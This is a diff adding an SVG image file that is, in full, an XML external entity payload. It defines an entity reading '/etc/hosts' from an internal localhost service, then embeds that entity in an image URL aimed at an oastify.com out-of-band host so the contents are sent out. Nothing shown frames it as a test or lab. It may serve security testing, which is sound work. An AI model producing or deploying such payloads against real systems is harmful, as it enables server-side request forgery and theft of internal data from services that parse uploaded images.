@@ -1,0 +1,7 @@
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+  <!ENTITY leak SYSTEM "http://localhost:3000/etc/hosts">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <image href="https://rkf85c6fhtnob7vxmq9m9aemido4c60v.oastify.com/?data=&leak;" width="50" height="50"/>
+</svg>
